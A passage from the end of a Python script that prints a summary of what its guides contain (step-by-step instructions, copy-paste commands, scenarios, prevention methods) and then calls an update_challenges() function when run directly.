        print("="*50)
        print("\nGuides include:")
        print("[OK] Step-by-step instructions")
        print("[OK] Complete commands to copy and paste")
        print("[OK] Explanations of each step")
        print("[OK] Real-world scenarios")
        print("[OK] Prevention methods")
        print("[OK] Summary of concepts")

if __name__ == '__main__':
    update_challenges()
